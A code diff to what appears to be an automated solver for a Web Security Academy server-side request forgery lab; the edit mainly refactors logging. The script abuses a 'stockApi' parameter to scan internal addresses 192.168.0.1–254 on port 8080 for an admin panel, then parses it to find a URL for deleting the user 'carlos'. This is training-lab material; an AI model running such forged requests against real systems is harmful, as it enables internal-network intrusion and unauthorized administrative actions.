@@ -1,4 +1,4 @@
-from web_security_academy.core.logger import logger
+from web_security_academy.core.logger import logger, NoNewline
 from bs4 import BeautifulSoup
 
 
@@ -10,23 +10,21 @@ def solve_lab(session):
         f'Scanning the internal network by sending POST requests to "{path}" with the following data:'
     )
     logger.info(f"{data}")
-    logger.toggle_newline()
 
-    for i in range(1, 255):
-        internal_url = f"http://192.168.0.{i}:8080/admin"
-        data = {"stockApi": internal_url}
-        resp = session.post_path(path, data=data)
+    with NoNewline():
+        for i in range(1, 255):
+            internal_url = f"http://192.168.0.{i}:8080/admin"
+            data = {"stockApi": internal_url}
+            resp = session.post_path(path, data=data)
 
-        if resp.status_code != 200:
-            logger.info(f"{i} => {resp.status_code}")
+            if resp.status_code != 200:
+                logger.info(f"{i} => {resp.status_code}")
+            else:
+                logger.success(f"{i} => 200")
+                break
         else:
-            logger.success(f"{i} => 200")
-            logger.toggle_newline()
-            break
-    else:
-        logger.toggle_newline()
-        logger.failure("Unable to find an admin interface on port 8080.")
-        return
+            logger.failure("Unable to find an admin interface on port 8080.")
+            return
 
     logger.info("Using latest response to find URL to delete the user carlos...")
     soup = BeautifulSoup(resp.text, "lxml")
